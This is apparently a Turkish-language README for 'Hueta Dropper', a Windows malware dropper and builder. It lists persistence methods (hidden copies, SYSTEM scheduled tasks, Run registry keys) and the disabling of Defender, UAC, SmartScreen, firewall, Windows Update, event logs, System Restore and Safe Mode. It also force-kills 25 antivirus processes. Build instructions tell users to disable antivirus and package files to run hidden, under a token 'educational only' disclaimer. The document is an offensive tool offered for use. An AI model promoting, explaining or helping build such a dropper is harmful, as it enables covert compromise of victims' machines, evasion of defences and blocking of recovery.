# HUETA DROPPER

<p align="center">
  <img src="logo.png" alt="Hueta Dropper" width="200">
</p>

---

Dosyalarınız için tam kararlılık sağlayan ve tüm olasılıkları açan bir dropper.

Yönetici ayrıcalıklarıyla çalışır (UAC istemi). İlk başlatma:

- Kendini gizli ve sistem klasörlerine kopyalar
- Görev Zamanlayıcı'ya ekler (SYSTEM, kullanıcı oturumunda)
- Kayıt Defteri'ne ekler (HKCU + HKLM Run)
- Sistemi temizler ve yükü dağıtır
- Arka plan koruyucusunu başlatır

---

## Temel Özellikler

- 🛡️ WinDefend, WdNisSvc, WdNisDrv, SecurityHealthService, wscsvc, SgrmBroker'ı devre dışı bırakır
- 🔇 Gerçek Zamanlı İzleme, Davranış İzleme, Bulut Koruması (MAPS), örnek gönderimini devre dışı bırakır
- 🔒 Tam UAC devre dışı
- 🖥️ SmartScreen devre dışı
- 🔥 Güvenlik Duvarı devre dışı, MpsSvc durduruldu, tüm profiller kapalı
- 🔄 Windows Update devre dışı, wuauserv, UsoSvc, WaaSMedicSvc, dosvc durduruldu + politikalar engellendi
- 📋 EventLog, EventSystem devre dışı, günlükler her 30 saniyede temizlenir
- 💾 Sistem Geri Yükleme noktaları kaldırıldı, WinRE devre dışı, BCD ile Güvenli Mod engellendi
- ⚡ Yüksek Performans güç planı zorlandı, uyku/hazırda bekletme/ekran koruyucu kapalı
- 🔧 Sürücü otomatik güncelleme devre dışı
- 🚫 Güvenli Mod, kurtarma, harici önyükleme engellendi
- 🛑 25 antivirüs sürecini izler, zorla sonlandırma

---

## TALİMAT

### Dropper Oluşturma

1. **Tüm antivirüsleri devre dışı bırakın**, [indirme](../../raw/main/Builder.exe) sayfasına gidin ve `Builder.exe`'yi açın
2. İlk sekmeye gidin, **gizli modda** çalışması gereken dosyalarınızı ekleyin

> ⚠️ **UYARI.** Normal modda çalışması gereken dosyaları dropper'a koymayın. Oluşturduktan sonra açıcıyı kullanın.

<p align="center">
  <img src="screen1.png" alt="Builder Dropper" width="500">
</p>

3. **"Build hueta.exe"** düğmesine tıklayın ve dosyayı kaydedin. Derlemeniz hazır!

---

### Açıcı Oluşturma

1. `Builder.exe`'yi açın
2. İkinci sekmeye gidin, **normal modda** çalışması gereken dosyalarınızı ekleyin

<p align="center">
  <img src="screen2.png" alt="Builder Extractor" width="500">
</p>

3. **"Build build.exe"** düğmesine tıklayın ve dosyayı kaydedin. Derlemeniz hazır!

---

## Yasal Uyarı

**Yalnızca eğitim amaçlıdır.** Risk size aittir.
